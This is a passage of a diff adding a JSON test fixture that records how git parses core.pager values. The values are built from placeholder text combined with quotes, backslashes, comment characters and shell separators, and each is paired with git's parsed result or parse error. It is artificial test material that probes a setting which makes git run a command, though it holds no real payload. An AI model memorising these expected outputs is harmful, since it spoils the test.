+      "config": "[core]\n\tpager = \"cmd#x\\\\\"\n",
+      "git": [
+        "core.pager=cmd#x\\"
+      ],
+      "gitError": null
+    },
+    "perm-237": {
+      "config": "[core]\n\tpager = \"cmd#x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-237.gitconfig"
+    },
+    "perm-240": {
+      "config": "[core]\n\tpager = \"cmd;x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-240.gitconfig"
+    },
+    "perm-241": {
+      "config": "[core]\n\tpager = \"cmd;xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-241.gitconfig"
+    },
+    "perm-242": {
+      "config": "[core]\n\tpager = \"cmd;x\"\n",
+      "git": [
+        "core.pager=cmd;x"
+      ],
+      "gitError": null
+    },
+    "perm-243": {
+      "config": "[core]\n\tpager = \"cmd;x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-243.gitconfig"
+    },
+    "perm-244": {
+      "config": "[core]\n\tpager = \"cmd;x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-244.gitconfig"
+    },
+    "perm-245": {
+      "config": "[core]\n\tpager = \"cmd;x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-245.gitconfig"
+    },
+    "perm-246": {
+      "config": "[core]\n\tpager = \"cmd;x\\\\\"\n",
+      "git": [
+        "core.pager=cmd;x\\"
+      ],
+      "gitError": null
+    },
+    "perm-247": {
+      "config": "[core]\n\tpager = \"cmd;x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-247.gitconfig"
+    },
+    "perm-250": {
+      "config": "[core]\n\tpager = \"cmd x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-250.gitconfig"
+    },
+    "perm-251": {
+      "config": "[core]\n\tpager = \"cmd xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-251.gitconfig"
+    },
+    "perm-252": {
+      "config": "[core]\n\tpager = \"cmd x\"\n",
+      "git": [
+        "core.pager=cmd x"
+      ],
+      "gitError": null
+    },
+    "perm-253": {
+      "config": "[core]\n\tpager = \"cmd x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-253.gitconfig"
+    },
+    "perm-254": {
+      "config": "[core]\n\tpager = \"cmd x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-254.gitconfig"
+    },
+    "perm-255": {
+      "config": "[core]\n\tpager = \"cmd x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-255.gitconfig"
+    },
+    "perm-256": {
+      "config": "[core]\n\tpager = \"cmd x\\\\\"\n",
+      "git": [
+        "core.pager=cmd x\\"
+      ],
+      "gitError": null
+    },
+    "perm-257": {
+      "config": "[core]\n\tpager = \"cmd x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-257.gitconfig"
+    },
+    "perm-260": {
+      "config": "[core]\n\tpager = \"cmd\\\\\"x\n",
+      "git": [
+        "core.pager=cmd\\x"
+      ],
+      "gitError": null
+    },
+    "perm-261": {
+      "config": "[core]\n\tpager = \"cmd\\\\\"xa\n",
+      "git": [
+        "core.pager=cmd\\xa"
+      ],
+      "gitError": null
+    },
+    "perm-262": {
+      "config": "[core]\n\tpager = \"cmd\\\\\"x\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-262.gitconfig"
+    },
+    "perm-263": {
+      "config": "[core]\n\tpager = \"cmd\\\\\"x#\n",
+      "git": [
+        "core.pager=cmd\\x"
+      ],
+      "gitError": null
+    },
+    "perm-264": {
+      "config": "[core]\n\tpager = \"cmd\\\\\"x;\n",
+      "git": [
+        "core.pager=cmd\\x"
+      ],
+      "gitError": null
+    },
+    "perm-265": {
+      "config": "[core]\n\tpager = \"cmd\\\\\"x \n",
+      "git": [
+        "core.pager=cmd\\x"
+      ],
+      "gitError": null
+    },
+    "perm-266": {
+      "config": "[core]\n\tpager = \"cmd\\\\\"x\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-266.gitconfig"
+    },
+    "perm-267": {
+      "config": "[core]\n\tpager = \"cmd\\\\\"x|\n",
+      "git": [
+        "core.pager=cmd\\x|"
+      ],
+      "gitError": null
+    },
+    "perm-270": {
+      "config": "[core]\n\tpager = \"cmd|x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-270.gitconfig"
+    },
+    "perm-271": {
+      "config": "[core]\n\tpager = \"cmd|xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-271.gitconfig"
+    },
+    "perm-272": {
+      "config": "[core]\n\tpager = \"cmd|x\"\n",
+      "git": [
+        "core.pager=cmd|x"
+      ],
+      "gitError": null
+    },
+    "perm-273": {
+      "config": "[core]\n\tpager = \"cmd|x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-273.gitconfig"
+    },
+    "perm-274": {
+      "config": "[core]\n\tpager = \"cmd|x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-274.gitconfig"
+    },
+    "perm-275": {
+      "config": "[core]\n\tpager = \"cmd|x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-275.gitconfig"
+    },
+    "perm-276": {
+      "config": "[core]\n\tpager = \"cmd|x\\\\\"\n",
+      "git": [
+        "core.pager=cmd|x\\"
+      ],
+      "gitError": null
+    },
+    "perm-277": {
+      "config": "[core]\n\tpager = \"cmd|x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-277.gitconfig"
+    },
+    "perm-300": {
+      "config": "[core]\n\tpager = #cmdx\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-301": {
+      "config": "[core]\n\tpager = #cmdxa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-302": {
+      "config": "[core]\n\tpager = #cmdx\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-303": {
+      "config": "[core]\n\tpager = #cmdx#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-304": {
+      "config": "[core]\n\tpager = #cmdx;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-305": {
+      "config": "[core]\n\tpager = #cmdx \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-306": {
+      "config": "[core]\n\tpager = #cmdx\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-307": {
+      "config": "[core]\n\tpager = #cmdx|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-310": {
+      "config": "[core]\n\tpager = #cmdax\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-311": {
+      "config": "[core]\n\tpager = #cmdaxa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-312": {
+      "config": "[core]\n\tpager = #cmdax\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-313": {
+      "config": "[core]\n\tpager = #cmdax#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-314": {
+      "config": "[core]\n\tpager = #cmdax;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-315": {
+      "config": "[core]\n\tpager = #cmdax \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-316": {
+      "config": "[core]\n\tpager = #cmdax\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-317": {
+      "config": "[core]\n\tpager = #cmdax|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-320": {
+      "config": "[core]\n\tpager = #cmd\"x\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-321": {
+      "config": "[core]\n\tpager = #cmd\"xa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-322": {
+      "config": "[core]\n\tpager = #cmd\"x\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-323": {
+      "config": "[core]\n\tpager = #cmd\"x#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-324": {
+      "config": "[core]\n\tpager = #cmd\"x;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-325": {
+      "config": "[core]\n\tpager = #cmd\"x \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-326": {
+      "config": "[core]\n\tpager = #cmd\"x\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-327": {
+      "config": "[core]\n\tpager = #cmd\"x|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-330": {
+      "config": "[core]\n\tpager = #cmd#x\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-331": {
+      "config": "[core]\n\tpager = #cmd#xa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-332": {
+      "config": "[core]\n\tpager = #cmd#x\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-333": {
+      "config": "[core]\n\tpager = #cmd#x#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-334": {
+      "config": "[core]\n\tpager = #cmd#x;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-335": {
+      "config": "[core]\n\tpager = #cmd#x \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-336": {
+      "config": "[core]\n\tpager = #cmd#x\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-337": {
+      "config": "[core]\n\tpager = #cmd#x|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-340": {
+      "config": "[core]\n\tpager = #cmd;x\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-341": {
+      "config": "[core]\n\tpager = #cmd;xa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-342": {
+      "config": "[core]\n\tpager = #cmd;x\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-343": {
+      "config": "[core]\n\tpager = #cmd;x#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-344": {
+      "config": "[core]\n\tpager = #cmd;x;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-345": {
+      "config": "[core]\n\tpager = #cmd;x \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-346": {
+      "config": "[core]\n\tpager = #cmd;x\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-347": {
+      "config": "[core]\n\tpager = #cmd;x|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-350": {
+      "config": "[core]\n\tpager = #cmd x\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-351": {
+      "config": "[core]\n\tpager = #cmd xa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-352": {
+      "config": "[core]\n\tpager = #cmd x\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-353": {
+      "config": "[core]\n\tpager = #cmd x#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-354": {
+      "config": "[core]\n\tpager = #cmd x;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-355": {
+      "config": "[core]\n\tpager = #cmd x \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-356": {
+      "config": "[core]\n\tpager = #cmd x\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-357": {
+      "config": "[core]\n\tpager = #cmd x|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-360": {
+      "config": "[core]\n\tpager = #cmd\\\\\"x\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-361": {
+      "config": "[core]\n\tpager = #cmd\\\\\"xa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-362": {
+      "config": "[core]\n\tpager = #cmd\\\\\"x\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-363": {
+      "config": "[core]\n\tpager = #cmd\\\\\"x#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-364": {
+      "config": "[core]\n\tpager = #cmd\\\\\"x;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-365": {
+      "config": "[core]\n\tpager = #cmd\\\\\"x \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-366": {
+      "config": "[core]\n\tpager = #cmd\\\\\"x\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-367": {
+      "config": "[core]\n\tpager = #cmd\\\\\"x|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-370": {
+      "config": "[core]\n\tpager = #cmd|x\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-371": {
+      "config": "[core]\n\tpager = #cmd|xa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-372": {
+      "config": "[core]\n\tpager = #cmd|x\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-373": {
+      "config": "[core]\n\tpager = #cmd|x#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-374": {
+      "config": "[core]\n\tpager = #cmd|x;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-375": {
+      "config": "[core]\n\tpager = #cmd|x \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-376": {
+      "config": "[core]\n\tpager = #cmd|x\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-377": {
+      "config": "[core]\n\tpager = #cmd|x|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-400": {
+      "config": "[core]\n\tpager = ;cmdx\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-401": {
+      "config": "[core]\n\tpager = ;cmdxa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-402": {
+      "config": "[core]\n\tpager = ;cmdx\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-403": {
+      "config": "[core]\n\tpager = ;cmdx#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-404": {
+      "config": "[core]\n\tpager = ;cmdx;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-405": {
+      "config": "[core]\n\tpager = ;cmdx \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-406": {
+      "config": "[core]\n\tpager = ;cmdx\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-407": {
+      "config": "[core]\n\tpager = ;cmdx|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-410": {
+      "config": "[core]\n\tpager = ;cmdax\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-411": {
+      "config": "[core]\n\tpager = ;cmdaxa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-412": {
+      "config": "[core]\n\tpager = ;cmdax\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-413": {
+      "config": "[core]\n\tpager = ;cmdax#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-414": {
+      "config": "[core]\n\tpager = ;cmdax;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-415": {
+      "config": "[core]\n\tpager = ;cmdax \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-416": {
+      "config": "[core]\n\tpager = ;cmdax\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-417": {
+      "config": "[core]\n\tpager = ;cmdax|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-420": {
+      "config": "[core]\n\tpager = ;cmd\"x\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-421": {
+      "config": "[core]\n\tpager = ;cmd\"xa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-422": {
+      "config": "[core]\n\tpager = ;cmd\"x\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-423": {
+      "config": "[core]\n\tpager = ;cmd\"x#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-424": {
+      "config": "[core]\n\tpager = ;cmd\"x;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-425": {
+      "config": "[core]\n\tpager = ;cmd\"x \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-426": {
+      "config": "[core]\n\tpager = ;cmd\"x\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-427": {
+      "config": "[core]\n\tpager = ;cmd\"x|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-430": {
+      "config": "[core]\n\tpager = ;cmd#x\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-431": {
+      "config": "[core]\n\tpager = ;cmd#xa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-432": {
+      "config": "[core]\n\tpager = ;cmd#x\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-433": {
+      "config": "[core]\n\tpager = ;cmd#x#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-434": {
+      "config": "[core]\n\tpager = ;cmd#x;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-435": {
+      "config": "[core]\n\tpager = ;cmd#x \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-436": {
+      "config": "[core]\n\tpager = ;cmd#x\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-437": {
+      "config": "[core]\n\tpager = ;cmd#x|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-440": {
+      "config": "[core]\n\tpager = ;cmd;x\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-441": {
+      "config": "[core]\n\tpager = ;cmd;xa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-442": {
+      "config": "[core]\n\tpager = ;cmd;x\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-443": {
+      "config": "[core]\n\tpager = ;cmd;x#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-444": {
+      "config": "[core]\n\tpager = ;cmd;x;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-445": {
+      "config": "[core]\n\tpager = ;cmd;x \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-446": {
+      "config": "[core]\n\tpager = ;cmd;x\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-447": {
+      "config": "[core]\n\tpager = ;cmd;x|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-450": {
+      "config": "[core]\n\tpager = ;cmd x\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-451": {
+      "config": "[core]\n\tpager = ;cmd xa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-452": {
+      "config": "[core]\n\tpager = ;cmd x\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-453": {
+      "config": "[core]\n\tpager = ;cmd x#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-454": {
+      "config": "[core]\n\tpager = ;cmd x;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-455": {
+      "config": "[core]\n\tpager = ;cmd x \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-456": {
+      "config": "[core]\n\tpager = ;cmd x\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-457": {
+      "config": "[core]\n\tpager = ;cmd x|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-460": {
+      "config": "[core]\n\tpager = ;cmd\\\\\"x\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-461": {
+      "config": "[core]\n\tpager = ;cmd\\\\\"xa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-462": {
+      "config": "[core]\n\tpager = ;cmd\\\\\"x\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-463": {
+      "config": "[core]\n\tpager = ;cmd\\\\\"x#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-464": {
+      "config": "[core]\n\tpager = ;cmd\\\\\"x;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-465": {
+      "config": "[core]\n\tpager = ;cmd\\\\\"x \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-466": {
+      "config": "[core]\n\tpager = ;cmd\\\\\"x\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-467": {
+      "config": "[core]\n\tpager = ;cmd\\\\\"x|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-470": {
+      "config": "[core]\n\tpager = ;cmd|x\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-471": {
+      "config": "[core]\n\tpager = ;cmd|xa\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-472": {
+      "config": "[core]\n\tpager = ;cmd|x\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-473": {
+      "config": "[core]\n\tpager = ;cmd|x#\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-474": {
+      "config": "[core]\n\tpager = ;cmd|x;\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-475": {
+      "config": "[core]\n\tpager = ;cmd|x \n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-476": {
+      "config": "[core]\n\tpager = ;cmd|x\\\\\"\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-477": {
+      "config": "[core]\n\tpager = ;cmd|x|\n",
+      "git": [
+        "core.pager="
+      ],
+      "gitError": null
+    },
+    "perm-500": {
+      "config": "[core]\n\tpager =  cmdx\n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-501": {
+      "config": "[core]\n\tpager =  cmdxa\n",
+      "git": [
+        "core.pager=cmdxa"
+      ],
+      "gitError": null
+    },
+    "perm-502": {
+      "config": "[core]\n\tpager =  cmdx\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-502.gitconfig"
+    },
+    "perm-503": {
+      "config": "[core]\n\tpager =  cmdx#\n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-504": {
+      "config": "[core]\n\tpager =  cmdx;\n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-505": {
+      "config": "[core]\n\tpager =  cmdx \n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-506": {
+      "config": "[core]\n\tpager =  cmdx\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-506.gitconfig"
+    },
+    "perm-507": {
+      "config": "[core]\n\tpager =  cmdx|\n",
+      "git": [
+        "core.pager=cmdx|"
+      ],
+      "gitError": null
+    },
+    "perm-510": {
+      "config": "[core]\n\tpager =  cmdax\n",
+      "git": [
+        "core.pager=cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-511": {
+      "config": "[core]\n\tpager =  cmdaxa\n",
+      "git": [
+        "core.pager=cmdaxa"
+      ],
+      "gitError": null
+    },
+    "perm-512": {
+      "config": "[core]\n\tpager =  cmdax\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-512.gitconfig"
+    },
+    "perm-513": {
+      "config": "[core]\n\tpager =  cmdax#\n",
+      "git": [
+        "core.pager=cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-514": {
+      "config": "[core]\n\tpager =  cmdax;\n",
+      "git": [
+        "core.pager=cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-515": {
+      "config": "[core]\n\tpager =  cmdax \n",
+      "git": [
+        "core.pager=cmdax"
+      ],
+      "gitError": null
+    },
+    "perm-516": {
+      "config": "[core]\n\tpager =  cmdax\\\\\"\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-516.gitconfig"
+    },
+    "perm-517": {
+      "config": "[core]\n\tpager =  cmdax|\n",
+      "git": [
+        "core.pager=cmdax|"
+      ],
+      "gitError": null
+    },
+    "perm-520": {
+      "config": "[core]\n\tpager =  cmd\"x\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-520.gitconfig"
+    },
+    "perm-521": {
+      "config": "[core]\n\tpager =  cmd\"xa\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-521.gitconfig"
+    },
+    "perm-522": {
+      "config": "[core]\n\tpager =  cmd\"x\"\n",
+      "git": [
+        "core.pager=cmdx"
+      ],
+      "gitError": null
+    },
+    "perm-523": {
+      "config": "[core]\n\tpager =  cmd\"x#\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-523.gitconfig"
+    },
+    "perm-524": {
+      "config": "[core]\n\tpager =  cmd\"x;\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-524.gitconfig"
+    },
+    "perm-525": {
+      "config": "[core]\n\tpager =  cmd\"x \n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-525.gitconfig"
+    },
+    "perm-526": {
+      "config": "[core]\n\tpager =  cmd\"x\\\\\"\n",
+      "git": [
+        "core.pager=cmdx\\"
+      ],
+      "gitError": null
+    },
+    "perm-527": {
+      "config": "[core]\n\tpager =  cmd\"x|\n",
+      "git": null,
+      "gitError": "fatal: bad config line 2 in file /tmp/gs-golden-HeYvfq/perm-527.gitconfig"
+    },
+    "perm-530": {
+      "config": "[core]\n\tpager =  cmd#x\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-531": {
+      "config": "[core]\n\tpager =  cmd#xa\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-532": {
+      "config": "[core]\n\tpager =  cmd#x\"\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-533": {
+      "config": "[core]\n\tpager =  cmd#x#\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-534": {
+      "config": "[core]\n\tpager =  cmd#x;\n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-535": {
+      "config": "[core]\n\tpager =  cmd#x \n",
+      "git": [
+        "core.pager=cmd"
+      ],
+      "gitError": null
+    },
+    "perm-536": {
